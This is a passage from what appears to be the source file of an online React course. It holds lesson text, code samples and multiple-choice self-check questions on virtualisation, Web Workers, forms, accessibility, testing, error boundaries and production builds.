      overscanCount={4}     // extra rows above and below, kills flicker
      width="100%"
    >
      {Row}
    </FixedSizeList>
  );
}
\`\`\`

For 5,000 students at 48 px in a 600 px viewport, that is about **13 rendered rows plus 8 overscan instead of 5,000** — a 99.6% cut in DOM nodes.

Forgetting to spread \`style\` onto the row is the classic mistake: every row stacks at the top of the container and the list appears empty below the first item.

### What virtualisation costs

- Rows must have a known or measurable height. Variable heights need \`VariableSizeList\` or a measuring library.
- Browser find-in-page only sees rendered rows.
- Anchor links and \`scrollIntoView\` into an unrendered row do not work without the library's scroll-to-item API.
- Accessibility needs care: keep a real \`role="list"\`/\`role="listitem"\` structure, and remember that a virtualised grid must still expose row and column counts.

Use it above roughly 200 rows, or sooner if each row is complex. Below that, pagination or a "load more" button is simpler and has none of these downsides.
        `,
        [
          q('Which of these is the wrong thing to code-split?', [
            'A route that only administrators ever visit',
            'A 300 KB charting library behind an analytics tab',
            'A 4 KB modal used on one page',
            'A rich text editor loaded when the user starts editing',
          ], 2, 'Each chunk costs a request and a loading state, so splitting something small makes the app slower and blinkier for no saved bytes.'),
          q('What does onMouseEnter={() => import("./routes/Analytics")} on a link achieve?', [
            'It navigates to the route early',
            'It warms the chunk before the click, so the route renders without waiting on a download',
            'It prefetches the API data that route will need',
            'Nothing, since dynamic import only works at module top level',
          ], 1, 'The dynamic import starts the chunk download on intent, and by the time the click lands the module is already in memory.'),
          q('Which is a genuine cost of virtualising a list?', [
            'Every row must be wrapped in React.memo',
            'Keys are no longer needed on the rows',
            'The underlying data can no longer be sorted or filtered',
            'Browser find-in-page and scrollIntoView only see the rows currently rendered',
          ], 3, 'Rows outside the window do not exist in the DOM, so anything the browser does by searching the DOM cannot find them.'),
        ]
      ),
        lesson('Moving Work Off the Main Thread', 13, `
The main thread runs your JavaScript, layout, paint and every event handler, one at a time. A 400 ms function does not merely cost 400 ms of computation — for that whole stretch the page cannot scroll, respond to a click, or advance an animation.

### Do less, do it later, do it elsewhere

Take those in order. Removing work beats scheduling it, and scheduling it beats shipping it to another thread, because the other thread charges you a copying fee on the way there and back.

### Yield inside a long loop

A task over 50 ms counts as a long task; past roughly 200 ms the delay is something a user feels. When the work is a loop, break it into chunks and give control back between them:

\`\`\`js
async function processInChunks(items, work, size = 200) {
  for (let i = 0; i < items.length; i += size) {
    for (const item of items.slice(i, i + size)) work(item);
    await new Promise(resolve => setTimeout(resolve, 0));   // paint and input happen here
  }
}
\`\`\`

Where it is available, \`await scheduler.yield()\` does the same without the timer clamp. Neither makes the work faster; both make the page responsive while it happens, which is precisely what INP measures.

\`requestIdleCallback(fn, { timeout: 2000 })\` covers the other case — work that should happen but not now, such as flushing analytics, warming a cache, or precomputing the next page. Always pass a timeout, because an app that is never idle otherwise never runs the callback at all.

### A worker for genuinely heavy computation

Parsing a 20 MB CSV, building a client-side search index, hashing a file before upload, diffing two large documents: pure computation over data, with no DOM involved.

\`\`\`js
// csv.worker.js — its own thread, its own global scope
self.onmessage = (e) => {
  self.postMessage(parseCsv(e.data));
};
\`\`\`

\`\`\`jsx
function CsvImport({ file }) {
  const [rows, setRows] = useState([]);

  const worker = useMemo(
    () => new Worker(new URL('./csv.worker.js', import.meta.url), { type: 'module' }),
    []
  );

  useEffect(() => {
    worker.onmessage = (e) => setRows(e.data);
    return () => worker.terminate();      // threads do not clean themselves up
  }, [worker]);

  return <button onClick={() => file.text().then(t => worker.postMessage(t))}>Import</button>;
}
\`\`\`

Two facts decide whether this pays. **A worker has no DOM, no \`window\` and no React** — it returns data and the main thread renders it. And **\`postMessage\` copies**: structured-cloning a 50 MB array costs real milliseconds at both ends, so a 5 ms job is slower in a worker than it was in place.

For binary data, transfer ownership instead of copying:

\`\`\`js
worker.postMessage(buffer, [buffer]);   // moved, not cloned
console.log(buffer.byteLength);         // 0 — this buffer is now detached
\`\`\`

That second line is the classic mistake. After a transfer the sender no longer owns the buffer, and code that reads it afterwards finds an empty, detached object rather than the data it wrote a moment ago.

### Choosing

| Work | Where it belongs |
|---|---|
| Filtering 500 rows on each keystroke | Main thread; it is already fast enough |
| Filtering 200,000 rows | A worker, or the server |
| Anything that touches the DOM or React state | Main thread, always |
| Resizing an image before upload | Worker, with a transferred buffer |
| Flushing analytics, warming a cache | requestIdleCallback |

The mistake that undoes all of this is creating the worker inside render, or one per keystroke. Startup plus module parse costs a few milliseconds every time, and every orphaned worker keeps a thread alive. Create one, reuse it, terminate it on unmount.
        `,
        [
          q('What does awaiting a setTimeout of 0 between chunks of a long loop achieve?', [
            'It yields control so the browser can paint and handle input between chunks',
            'It makes the loop itself execute faster',
            'It moves the loop onto a background thread',
            'It guarantees the whole loop finishes within one frame',
          ], 0, 'Chunking does not reduce the total work; it inserts gaps in which the browser can run its own tasks, so the page stays responsive.'),
          q('You postMessage a large ArrayBuffer using the transfer list, then read it on the main thread. What do you find?', [
            'A complete copy of the data',
            'The read blocks until the worker replies',
            'A detached buffer with a byteLength of 0',
            'The transfer is ignored for buffers above 1 MB',
          ], 2, 'Transferring moves ownership to the worker rather than cloning, so the sending side is left holding a detached, empty buffer.'),
          q('Which task is the wrong fit for a Web Worker?', [
            'Parsing a 20 MB CSV upload',
            'Reading layout and updating the DOM as the parse progresses',
            'Building a search index over 50,000 records',
            'Hashing a file before uploading it',
          ], 1, 'A worker has no DOM and no window, so anything that measures or mutates the page has to stay on the main thread.'),
        ]
      ),
      ],
      [
        q('Which does NOT on its own cause a component to re-render?', [
          'Its own state changed',
          'Its parent re-rendered',
          'A context it consumes changed value',
          'Its props are compared and found equal',
        ], 3, 'Equal props do not prevent a re-render — only React.memo does — and they never trigger one either.'),
        q('A memoised Row still re-renders 500 times. The parent passes onSelect={(id) => ...} inline. Why?', [
          'The inline function is a new reference each render, so the shallow prop comparison fails',
          'memo only works on class components',
          'The key prop is unstable',
          'memo requires a custom comparator',
        ], 0, 'React.memo compares props by identity; a freshly created function fails that check every single render.'),
        q('When is useMemo genuinely worth adding?', [
          'Around every derived value, as a habit',
          'Whenever a component has more than three props',
          'When the computation is measurably expensive or the reference must stay stable',
          'Only inside custom hooks',
        ], 2, 'Memoisation has a real cost, so it pays off only for expensive work or for identity that something else depends on.'),
        q('In react-window, forgetting to spread the style prop onto each row causes what?', [
          'Rows render with default browser styles',
          'All rows stack at the top because their absolute positioning is lost',
          'The list refuses to scroll',
          'Only the last row renders',
        ], 1, 'The library positions rows absolutely via that style object; without it every row sits at offset zero.'),
      ]
    ),
    chapter(
      'Forms, Accessibility, and Testing',
      'The three things that separate a demo from a product people can actually use and you can safely change.',
      [
        lesson('Forms and Validation', 14, `
Forms are where a React app meets reality: partial input, network failures, users on keyboards, and validation rules that change. Get the structure right and the rest is detail.

### Controlled and uncontrolled, and why it matters at scale

A **controlled** input reads its value from state, so React is the single source of truth. An **uncontrolled** input keeps its value in the DOM, and you read it on submit.

\`\`\`jsx
// Controlled — re-renders the form on every keystroke
<input value={email} onChange={e => setEmail(e.target.value)} />

// Uncontrolled — no re-render while typing
<input name="email" defaultValue="" ref={emailRef} />
\`\`\`

Controlled is right when you need live feedback: a character counter, dependent fields, or a filter that queries as you type. For a 30-field settings page, controlled inputs mean 30 fields re-rendering on every keystroke, which is exactly the problem Chapter 4 described.

**The switch that catches everyone:** \`value={undefined}\` makes an input uncontrolled, and setting it later throws the "A component is changing an uncontrolled input to be controlled" warning. Initialise with \`''\`, never \`null\` or \`undefined\`.

### A schema is the contract, used twice

Define validation once and share it between client and server:

\`\`\`js
import { z } from 'zod';

export const signupSchema = z.object({
  name: z.string().min(2, 'Name must be at least 2 characters'),
  email: z.string().email('Enter a valid email address'),
  password: z.string().min(8, 'Use at least 8 characters'),
  confirm: z.string(),
}).refine(d => d.password === d.confirm, {
  message: 'Passwords do not match',
  path: ['confirm'],          // attach the error to the right field
});
\`\`\`

### React Hook Form keeps typing cheap

\`\`\`jsx
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';

function SignupForm({ onDone }) {
  const {
    register, handleSubmit, setError,
    formState: { errors, isSubmitting },
  } = useForm({ resolver: zodResolver(signupSchema), mode: 'onTouched' });

  async function onSubmit(values) {
    const res = await fetch('/api/signup', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(values),
    });
    if (res.status === 409) {
      // Server-side truth wins — surface it on the field it belongs to
      return setError('email', { message: 'That email is already registered' });
    }
    if (!res.ok) return setError('root', { message: 'Something went wrong. Try again.' });
    onDone();
  }

  return (
    <form onSubmit={handleSubmit(onSubmit)} noValidate>
      <label htmlFor="email">Email</label>
      <input
        id="email"
        type="email"
        {...register('email')}
        aria-invalid={!!errors.email}
        aria-describedby={errors.email ? 'email-error' : undefined}
      />
      {errors.email && <p id="email-error" role="alert">{errors.email.message}</p>}

      <button type="submit" disabled={isSubmitting}>
        {isSubmitting ? 'Creating account…' : 'Create account'}
      </button>
    </form>
  );
}
\`\`\`

\`register\` wires the input as uncontrolled, so typing causes no re-render at all; the form re-renders only when validation state changes.

### The timing of errors is a design decision

Validating on every keystroke tells someone their email is invalid after the first character. \`mode: 'onTouched'\` waits until they first leave the field, then re-validates on every change after that — the pattern users find least hostile. Plain \`mode: 'onBlur'\` only ever validates on blur, so a field the user has just corrected keeps showing its error until they tab away again. Never validate only on submit for a long form; scrolling back up to find the problem is worse.

### Rules that hold everywhere

- **Never disable the submit button because the form is invalid.** The user gets no explanation and no way to trigger the error messages. Let them submit, then show what is wrong and move focus to the first invalid field.
- Do disable it while the request is in flight, and reflect that in the label, or you will get duplicate signups from double-clicks.
- Always pair \`<label htmlFor>\` with \`id\`. Placeholder text is not a label — it disappears when typing starts and is invisible to many screen readers.
- **Client validation is a convenience, not a defence.** Anyone can post directly to your endpoint, so the server validates the same schema again. That is not duplication; it is the only validation that actually protects your data.
        `,
        [
          q('For a 30-field settings page, why does register from React Hook Form beat a controlled input per field?', [
            'Uncontrolled inputs validate faster than controlled ones',
            'Controlled inputs cannot be validated by a schema',
            'register keeps the value in the DOM, so typing causes no re-render of the form at all',
            'Uncontrolled inputs do not need a submit handler',
          ], 2, 'Controlled fields re-render the whole form on every keystroke, which is exactly the avoidable work Chapter 4 warns about.'),
          q('What does mode: "onTouched" actually do?', [
            'Validates on every keystroke from the first character',
            'Validates only when the form is submitted',
            'Waits until the field is first left, then re-validates on every change after that',
            'Validates on blur every time, and never while typing',
          ], 2, 'It delays the first error until the user has finished the field, then gives live feedback while they fix it, which is the least hostile timing.'),
          q('The server replies 409 because the email is already registered. What is the right client response?', [
            'Throw so that the nearest error boundary renders',
            'Show a generic toast and clear the form',
            'Reload the page so the server state is re-read',
            'Call setError on the email field, so server truth appears where the user can act on it',
          ], 3, 'Only the server knows this rule, and attaching its verdict to the offending field keeps the correction in one place.'),
        ]
      ),
        lesson('Accessibility in React', 13, `
Accessibility work in React is mostly about not undoing what HTML already does. Roughly 15% of people have a disability of some kind, keyboard users include anyone with a trackpad failure or an injury, and in many jurisdictions this is a legal requirement rather than a nice-to-have.

### The div-with-onClick problem

\`\`\`jsx
<div className="btn" onClick={save}>Save</div>
\`\`\`

That element cannot be focused with Tab, does not fire on Enter or Space, announces as "Save" with no role, and has no disabled state. Reproducing all of that takes \`tabIndex\`, \`role\`, two key handlers, and \`aria-disabled\` — or you can write:

\`\`\`jsx
<button type="button" onClick={save}>Save</button>
\`\`\`

The same applies to \`<a>\` for navigation, \`<input type="checkbox">\` for checkboxes, and \`<dialog>\` or a properly built modal for overlays. **The first rule of ARIA is not to use ARIA when a native element exists.**

Note \`type="button"\`: a \`<button>\` inside a form defaults to \`type="submit"\`, so an unlabelled "Cancel" button will submit the form. That bug ships constantly.

### Labels, names, and state

\`\`\`jsx
{/* Visible label — the default and the best option */}
<label htmlFor="search">Search courses</label>
<input id="search" type="search" />

{/* Icon-only control still needs an accessible name */}
<button aria-label="Close dialog" onClick={close}>
  <XIcon aria-hidden="true" />
</button>

{/* Communicate state, do not just style it */}
<button aria-expanded={isOpen} aria-controls="menu-panel">Menu</button>
\`\`\`

\`aria-hidden="true"\` on the decorative icon stops a screen reader announcing "X" after the real label.

### Focus is the thing React breaks

Because React swaps content without a page load, focus stays wherever it was — often on a button that no longer exists, which drops focus to \`<body>\` and strands keyboard and screen-reader users at the top of nowhere.

\`\`\`jsx
// Move focus to the new page heading after a route change
function RouteAnnouncer() {
  const { pathname } = useLocation();
  const headingRef = useRef(null);

  useEffect(() => { headingRef.current?.focus(); }, [pathname]);

  return <h1 ref={headingRef} tabIndex={-1}>{titleFor(pathname)}</h1>;
}
\`\`\`

\`tabIndex={-1}\` makes an element programmatically focusable without adding it to the tab order.

Modals need three things: focus moves into the dialog on open, Tab is trapped inside it, and focus returns to the trigger on close. Use \`<dialog>\`'s \`showModal()\` or a library like Radix — hand-rolled focus traps are almost always subtly wrong.

### Announce what changes asynchronously

\`\`\`jsx
<div role="status" aria-live="polite">
  {isPending ? 'Loading results' : \`\${results.length} results found\`}
</div>
\`\`\`

Without a live region, a sighted user sees the results update and a screen-reader user hears silence. Use \`polite\` for status, \`assertive\` only for genuine errors.

### Numbers to hold yourself to

| Requirement | Threshold |
|---|---|
| Body text contrast | 4.5:1 against its background |
| Large text (18.66px bold / 24px) | 3:1 |
| Interactive control contrast | 3:1 for borders and focus rings |
| Touch target | 44 × 44 CSS pixels |

Never ship \`outline: none\` without a replacement focus style. That one line removes the only cue a keyboard user has about where they are.

### A five-minute audit

Unplug the mouse and Tab through the page: can you reach and operate everything, and always see where you are? Then run \`axe\` DevTools, or add it to your test suite:

\`\`\`js
import { axe } from 'jest-axe';
const { container } = render(<SignupForm />);
expect(await axe(container)).toHaveNoViolations();
\`\`\`

Automated tools catch about 30–40% of issues — contrast, missing labels, bad ARIA. The keyboard pass catches most of the rest.
        `,
        [
          q('A <button> inside a <form> has no type attribute. What happens when it is clicked?', [
            'Nothing, until an onClick handler is added',
            'It resets every field in the form',
            'It blurs the currently focused element',
            'It submits the form, because type defaults to submit',
          ], 3, 'The HTML default is type="submit", so an unlabelled Cancel button submits the form unless you write type="button".'),
          q('An icon-only close button contains an XIcon. What does the lesson do, and why?', [
            'aria-label on the button and aria-hidden="true" on the icon, so the control has exactly one clear name',
            'role="img" on the icon so it is announced alongside the button',
            'A title element inside the SVG, so the name is announced twice',
            'tabIndex={0} on the icon so it can be reached with the keyboard',
          ], 0, 'The button needs a name and the decorative glyph needs to be silent, otherwise a screen reader announces the icon after the real label.'),
          q('Automated tools such as axe catch roughly what share of accessibility problems?', [
            'Essentially all of them, if configured correctly',
            'About 30 to 40 percent, mostly contrast, missing labels and bad ARIA',
            'Only colour contrast issues',
            'None at all without a screen reader running',
          ], 1, 'Automation covers the machine-checkable third, which is why the keyboard pass is still the part that finds the rest.'),
        ]
      ),
        lesson('Testing with React Testing Library', 15, `
The guiding principle of React Testing Library is one sentence: **the more your tests resemble the way your software is used, the more confidence they give you.** Practically, that means you test what a user can see and do, never the internals.

### Setup and a first test

\`\`\`jsx
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import Counter from './Counter';

test('increments when the button is pressed', async () => {
  const user = userEvent.setup();
  render(<Counter />);

  const button = screen.getByRole('button', { name: /increment/i });
  await user.click(button);

  expect(screen.getByText('Count: 1')).toBeInTheDocument();
});
\`\`\`

Note what is absent: no reference to \`useState\`, no shallow rendering, no checking that a handler "was called". Rewrite \`Counter\` to use \`useReducer\` and this test still passes — which is the entire point.

### Query priority, in order

1. \`getByRole('button', { name })\` — how assistive technology sees the page. Default choice.
2. \`getByLabelText\` — form fields, and it fails if the label is not wired up, catching a real bug.
3. \`getByText\` — non-interactive content.
4. \`getByTestId\` — last resort, when nothing user-visible identifies the element.

Reaching for \`getByTestId\` first means your test cannot tell you whether the button is reachable, named, or labelled. If \`getByRole\` cannot find your control, that is usually the test reporting an accessibility bug from the previous lesson, not an inconvenience to work around.

### get, query, find — pick deliberately

| Prefix | Behaviour | Use for |
|---|---|---|
| \`getBy\` | Throws if not found | Something that must be there now |
| \`queryBy\` | Returns null | Asserting absence |
| \`findBy\` | Async, retries until timeout | Something that appears later |

\`\`\`jsx
expect(screen.queryByRole('alert')).not.toBeInTheDocument();   // absence
expect(await screen.findByText('Saved')).toBeInTheDocument();  // after async work
\`\`\`

Using \`getBy\` for something that arrives after a fetch is the most common failure in React test suites — it throws instantly because the assertion runs before the promise resolves. \`findBy\` retries.

### userEvent, not fireEvent

\`fireEvent.change(input, { target: { value: 'hi' } })\` dispatches one synthetic event. \`user.type(input, 'hi')\` fires focus, keydown, keypress, input, and keyup per character — and respects \`disabled\`, \`pointer-events: none\`, and focus order. Tests that pass with \`fireEvent\` and fail with \`userEvent\` are usually revealing a real bug.

### Mock the network, not your modules

\`\`\`jsx
import { http, HttpResponse } from 'msw';
import { setupServer } from 'msw/node';

const server = setupServer(
  http.get('/api/courses', () => HttpResponse.json([{ id: 1, title: 'React' }]))
);

beforeAll(() => server.listen());
afterEach(() => server.resetHandlers());
afterAll(() => server.close());

test('shows an error when the request fails', async () => {
  server.use(http.get('/api/courses', () => new HttpResponse(null, { status: 500 })));
  render(<CourseList />);
  expect(await screen.findByRole('alert')).toHaveTextContent(/could not load/i);
});
\`\`\`

Intercepting at the network layer means the component's real fetch code runs. Mocking your own \`api.js\` module tests that you called a function you wrote, which proves nothing about whether the request is right.

### Render with the providers the component needs

\`\`\`jsx
function renderWithProviders(ui, { route = '/' } = {}) {
  const client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(
    <QueryClientProvider client={client}>
      <MemoryRouter initialEntries={[route]}>{ui}</MemoryRouter>
    </QueryClientProvider>
  );
}
\`\`\`

\`retry: false\` matters: default retries make a failing-request test hang until it times out.

### What is worth testing

Test the behaviour a user depends on: the empty state, the error state, that a form submits the right values, that validation messages appear, that a disabled action stays disabled. Do not test that a \`<p>\` has a particular class, or that a child component "received prop x" — those tests break on every refactor and catch nothing. A test suite you are afraid to change is worse than no suite at all.
        `,
        [
          q('Why intercept the network with MSW instead of mocking your own api.js module?', [
            'MSW runs measurably faster in CI',
            'Jest cannot mock ES modules at all',
            'It removes the need for async queries',
            "The component's own fetch code still runs, so the test covers the request it actually makes",
          ], 3, 'Mocking your own module only proves you called a function you wrote; intercepting at the network layer tests the URL, method and payload too.'),
          q('Which query asserts that an alert is NOT on screen?', [
            'getByRole("alert") wrapped in expect().not',
            'findByRole("alert") with a short timeout',
            'queryByRole("alert"), because it returns null instead of throwing',
            'getAllByRole("alert") and a length check',
          ], 2, 'getBy throws when nothing matches, so the assertion never runs; queryBy is the variant designed for absence.'),
          q('A test passes with fireEvent.change but fails with user.type. What does that usually mean?', [
            'userEvent has not been set up correctly',
            'The test is exposing a real bug, because userEvent fires the full event sequence and respects disabled state and focus order',
            'fireEvent is deprecated and the test should be deleted',
            'The input is missing a defaultValue',
          ], 1, 'One synthetic change event can reach code paths a real user never could, so the stricter simulation is usually right.'),
        ]
      ),
        lesson('Wizards, Field Arrays, and File Uploads', 14, `
Three form shapes account for most of the difficulty in real products, and each has one mistake that everybody makes first.

### A wizard is one form with several views

Do not mount three separate forms and stitch their values together at the end. Keep one form state and validate a slice of the schema per step:

\`\`\`jsx
const stepSchemas = [accountSchema, profileSchema, planSchema];

function Wizard() {
  const [params, setParams] = useSearchParams();
  const step = Math.min(Number(params.get('step') ?? 0), stepSchemas.length - 1);

  const methods = useForm({
    resolver: zodResolver(stepSchemas[step]),
    mode: 'onTouched',
    defaultValues: draft,
  });

  const goNext = methods.handleSubmit(() => setParams({ step: String(step + 1) }));

  return (
    <FormProvider {...methods}>
      <form onSubmit={step === stepSchemas.length - 1 ? methods.handleSubmit(submitAll) : goNext}>
        {[<AccountStep />, <ProfileStep />, <PlanStep />][step]}
      </form>
    </FormProvider>
  );
}
\`\`\`

Three things are earning their place. The step lives in the URL, so refresh and the back button behave (Chapter 1), clamped because \`?step=9\` would otherwise index past the end of the array. \`FormProvider\` lets a field six levels down call \`useFormContext()\` instead of taking \`register\` through five intermediate components. And each step validates only its own fields, so nobody is told about a field they have not reached yet.

**The mistake:** rendering steps conditionally and losing values on Back. React Hook Form keeps the values of unmounted fields by default; turn \`shouldUnregister\` on, or remount the form on each step, and step one is blank when the user returns to check it. When you genuinely want values dropped — an optional branch the user skipped — remove them deliberately with \`unregister\`.

### Field arrays: key by identity, never by index

\`\`\`jsx
const { fields, append, remove } = useFieldArray({ control, name: 'invitees' });

{fields.map((field, i) => (
  <div key={field.id}>                                  {/* field.id, not i */}
    <label htmlFor={\`invitee-\${i}\`}>Email</label>
    <input id={\`invitee-\${i}\`} {...register(\`invitees.\${i}.email\`)} />
    <button type="button" onClick={() => remove(i)}>Remove</button>
  </div>
))}
<button type="button" onClick={() => append({ email: '' })}>Add another</button>
\`\`\`

\`useFieldArray\` generates an \`id\` per row for exactly this purpose. Key by \`i\` instead and Chapter 1's index-key bug arrives with real damage: remove the second row and the third row's half-typed address is still sitting in the input that now represents row two, because React reused that DOM node rather than moving it.

### Uploads: FormData, and XHR when you need progress

\`\`\`js
function upload(file, onProgress) {
  return new Promise((resolve, reject) => {
    const body = new FormData();
    body.append('file', file);

    const xhr = new XMLHttpRequest();
    xhr.upload.onprogress = (e) => {
      if (e.lengthComputable) onProgress(e.loaded / e.total);
    };
    xhr.onload = () =>
      xhr.status < 400 ? resolve(JSON.parse(xhr.responseText)) : reject(new Error(xhr.status));
    xhr.onerror = () => reject(new Error('Network error'));

    xhr.open('POST', '/api/uploads');
    xhr.send(body);                 // no Content-Type header — the browser adds the boundary
  });
}
\`\`\`

\`fetch\` still exposes no upload progress event, which is the one reason this API is worth remembering. Setting \`Content-Type\` by hand for \`FormData\` is the matching mistake: without the generated multipart boundary the server cannot parse the body at all.

Check type and size on the client for a fast message, then again on the server, because \`accept=".pdf"\` is a file-picker filter and not a check. And revoke previews:

\`\`\`jsx
useEffect(() => {
  const url = URL.createObjectURL(file);
  setPreview(url);
  return () => URL.revokeObjectURL(url);   // otherwise the blob is held for the whole session
}, [file]);
\`\`\`

Finally, keep the wizard honest about unsaved work: autosave the draft with the debounce hook from Chapter 2, and move focus to the new step heading on every step change, exactly as the accessibility topic did after a route change.
        `,
        [
          q('A wizard renders one step at a time, and values entered in step one are gone after the user goes Back. What is the likely cause?', [
            'React Hook Form keeps only the current step in state, by design',
            'The step schema for step one is wrong',
            'The fields were unregistered when the step unmounted, so their values were dropped from form state',
            'The values failed validation and were discarded',
          ], 2, 'Unmounting a step removes its inputs, and if unregistering on unmount is enabled their values leave the form state with them.'),
          q('useFieldArray rows are keyed with key={index}. What does the user actually see?', [
            'append silently stops working past ten rows',
            'The rows render in reverse order',
            'Validation messages attach to the wrong schema',
            "Removing a middle row leaves the next row's typed value sitting in the reused input",
          ], 3, 'Index keys make React reuse the DOM node for a different row, so the text typed into row three appears in row two after a removal.'),
          q('You need a progress bar for a 200 MB upload. What does the lesson use, and why?', [
            'fetch with a streamed response, because progress arrives in the response body',
            'XMLHttpRequest, because fetch exposes no upload progress event',
            'A polling endpoint that reports server-side progress',
            'Chunked fetch calls of 1 MB each with a manual counter',
          ], 1, 'Upload progress is the one thing fetch still cannot report, so XHR remains the practical choice for a real progress bar.'),
        ]
      ),
      ],
      [
        q('Why should you avoid disabling a submit button while the form is invalid?', [
          'Disabled buttons cannot be styled',
          'React cannot re-enable it reliably',
          'The user gets no explanation of what is wrong and no way to trigger the messages',
          'It prevents validation from running',
        ], 2, 'Blocking submission hides the reason; letting them submit and then showing focused errors is far more usable.'),
        q('An input starts as value={undefined} and later receives a string. What happens?', [
          'Nothing — React treats undefined as an empty string',
          'The form cannot be submitted',
          'The input becomes read-only',
          'React warns that an uncontrolled input became controlled',
        ], 3, 'undefined makes the input uncontrolled, so supplying a value later switches its mode — initialise with an empty string.'),
        q('A route change leaves keyboard focus on a button that no longer exists. Best fix?', [
          'Scroll to the top of the page',
          'Move focus to the new page heading, given tabIndex={-1}',
          'Add aria-live to the layout',
          'Re-render the navigation',
        ], 1, 'Focus must be moved deliberately after client-side navigation, and tabIndex={-1} lets a heading receive it programmatically.'),
        q('A test asserts on text that appears after a fetch resolves and fails immediately. What is wrong?', [
          'It uses getBy instead of findBy',
          'render() must be awaited',
          'userEvent needs setup()',
          'The component is missing a key',
        ], 0, 'getBy queries throw synchronously; findBy retries until the element appears or the timeout expires.'),
      ]
    ),
    chapter(
      'Shipping to Production',
      'Failing gracefully, building for a real environment, and the loading metrics users actually feel.',
      [
        lesson('Error Boundaries and Graceful Failure', 13, `
One \`undefined.map\` anywhere in your tree does not break one component. Since React 16 it unmounts the **entire application** and leaves a white screen, taking the user's half-written form with it. An error boundary is the only thing that stops that.

### A boundary is still a class component

\`\`\`jsx
class ErrorBoundary extends React.Component {
  state = { error: null };

  static getDerivedStateFromError(error) {
    return { error };            // render the fallback on the next render
  }

  componentDidCatch(error, info) {
    // info.componentStack names the subtree that threw
    reportToMonitoring(error, info.componentStack);
  }

  render() {
    if (this.state.error) {
      return this.props.fallback ?? <p role="alert">Something went wrong.</p>;
    }
    return this.props.children;
  }
}
\`\`\`

There is no hook equivalent — this is the one place a class is still required — so most teams install \`react-error-boundary\` and never write the class themselves.

### What a boundary does not catch

A boundary catches errors thrown during **render**, in **lifecycle methods**, and in constructors of the tree below it. It does not catch:

- errors in event handlers,
- anything asynchronous — \`setTimeout\`, a \`.then\` callback, a rejected \`fetch\`,
- errors thrown by the boundary's own render,
- errors during server rendering.

\`\`\`jsx
// NOT caught: React finished rendering long before this runs
<button onClick={async () => { const r = await fetch(url); setData(await r.json()); }}>Load</button>
\`\`\`

The classic bug follows directly: a team wraps a data screen in a boundary, deletes the local error state as "handled", and ships a page that spins forever when the API is down. A rejected promise is not a render error. Keep the error in state (Chapter 3's \`isError\`), or promote it to a render error deliberately:

\`\`\`jsx
if (error) throw error;   // now the boundary can see it
\`\`\`

### Place them where the page can survive

One boundary at the root is only a nicer white screen. Put boundaries where the surrounding page is still useful without the broken part: around each route, and around independent widgets — a chart, a comments panel, a third-party embed. A failed recommendations sidebar should never take the checkout form with it.

### Give the user a way out

\`\`\`jsx
import { ErrorBoundary } from 'react-error-boundary';

function Fallback({ error, resetErrorBoundary }) {
  return (
    <div role="alert" className="panel">
      <h2>This section could not load</h2>
      <p>{error.message}</p>
      <button onClick={resetErrorBoundary}>Try again</button>
    </div>
  );
}

<ErrorBoundary
  FallbackComponent={Fallback}
  resetKeys={[courseId]}                 // clears itself when the route changes
  onReset={() => qc.resetQueries({ queryKey: ['course', courseId] })}
>
  <CourseDetail id={courseId} />
</ErrorBoundary>
\`\`\`

Without \`resetKeys\` or a reset button, a boundary that trips once stays tripped for the rest of the session — the user navigates to a different record and still sees the error from the old one, because the boundary's state never cleared.

### Catch everything else globally

\`\`\`js
window.addEventListener('error', e => report(e.error));
window.addEventListener('unhandledrejection', e => report(e.reason));
\`\`\`

That is the safety net for the four cases above. Report, do not swallow: an empty \`catch\` is how a bug survives for months.

### Fallbacks are user interface

Give the fallback \`role="alert"\` so screen readers announce it (Chapter 5), keep it inside your layout so navigation still works, and never print a raw stack trace at a user. Show what failed, offer retry, and send the technical detail to your monitoring tool.
        `,
        [
          q('Which method makes an error boundary render its fallback?', [
            'componentDidCatch, by calling setState with the error',
            'static getDerivedStateFromError, which returns the new state',
            'render, by reading an error prop passed from the parent',
            'componentDidMount, after the first commit',
          ], 1, 'getDerivedStateFromError produces the fallback state during the render phase; componentDidCatch exists for the side effect of reporting.'),
          q('A single error boundary at the root of the app is', [
            'the recommended pattern, since fewer boundaries mean fewer fallbacks to design',
            'required before Suspense can be used anywhere in the tree',
            'only a nicer white screen, because boundaries belong around each route and around independent widgets',
            'sufficient as long as componentDidCatch reports to monitoring',
          ], 2, 'The point of a boundary is that the rest of the page survives, which only happens when it wraps something the page can do without.'),
          q('ErrorBoundary is given resetKeys={[courseId]}. What does that achieve?', [
            'The boundary clears itself when courseId changes, instead of staying tripped for the rest of the session',
            'It retries the failed render up to three times',
            'It attaches the course id to the report sent to monitoring',
            'It keeps the boundary mounted across route changes',
          ], 0, 'Boundary state persists until something resets it, so without reset keys the user still sees the old record error after navigating to a new one.'),
        ]
      ),
        lesson('Builds, Environments, and Source Maps', 14, `
The dev server and the production build are two different programs. Dev serves unbundled ES modules with hot reload and readable names; \`npm run build\` emits a minified, tree-shaken, content-hashed bundle. Almost every "worked on my machine" bug lives in that gap.

### What a production build emits

\`\`\`
dist/
  index.html                  # tiny, points at the hashed files
  assets/index-B7dK2p.js      # your app, minified
  assets/vendor-9fQ1xa.js     # dependencies, split out
  assets/index-4mZq0s.css
\`\`\`

The hash comes from the file's contents, so any change produces a new filename. That gives you a caching rule with no invalidation problem:

| File | Cache-Control |
|---|---|
| \`assets/*\` (hashed) | \`public, max-age=31536000, immutable\` |
| \`index.html\` | \`no-cache\` |

Get it backwards — caching \`index.html\` for a year — and returning users load an old HTML file pointing at chunks you have already deleted. The symptom is a blank page and \`Failed to fetch dynamically imported module\` after every deploy.

### Environment variables are compile-time text substitution

\`\`\`js
// .env.production
VITE_API_URL=https://api.example.com
\`\`\`

\`\`\`js
const res = await fetch(\`\${import.meta.env.VITE_API_URL}/courses\`);
\`\`\`

Vite exposes only variables prefixed \`VITE_\` (Create React App uses \`REACT_APP_\`). That prefix is a guard rail, not a security boundary. **Anything client code references is inlined as a literal string into a file the whole internet downloads.** Open the built JS in a text editor and search for the value; it is right there.

Base URLs, publishable keys, feature flags, analytics ids: fine. Stripe secret keys, database passwords, admin tokens: never — the browser asks your server, and your server holds the secret.

The second surprise is timing. Substitution happens at **build** time, not at boot, so restarting a container with a new \`API_URL\` changes nothing. Either build once per environment, or fetch a \`/config.json\` at runtime.

### A config that covers the everyday cases

\`\`\`js
